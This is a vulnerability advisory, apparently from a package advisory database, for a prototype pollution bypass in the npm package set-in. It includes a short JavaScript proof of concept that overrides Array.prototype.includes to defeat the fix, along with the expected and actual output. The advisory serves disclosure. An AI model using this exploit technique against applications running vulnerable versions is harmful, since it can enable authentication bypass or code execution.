    "Description": "### Summary\nA prototype pollution vulnerability exists in the the npm package set-in (\u003e=2.0.1). Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute Object.prototype via a crafted input using Array.prototype. This has been fixed in version 2.0.5.\n\n### Details\nThe vulnerability resides in line 28 of https://github.com/ahdinosaur/set-in/blob/master/index.js where includes() function is used to check whether user provided input contain forbidden strings.\n\n### PoC\n#### Steps to reproduce\n1. Install latest version of set-in using npm install or cloning from git\n2. Run the following code snippet:\n\n```javascript\nArray.prototype.includes = () =\u003e false; \nconst si = require('set-in');\nconst obj = {};\nconsole.log({}.polluted);\nsi(obj, [\n    'constructor',\n    'prototype',\n    'polluted'\n], 'yes');\nconsole.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');  // prints yes -\u003e indicating that the patch was bypassed and prototype pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted\nThis is printed on the console:\n```\nundefined \nyes\n```\n\n### Impact\nThis is a prototype pollution vulnerability, which can have severe security implications depending on how set-in is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.\nIt could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service\n3. Remote code execution (if polluted property is passed to sinks like eval or child_process)",
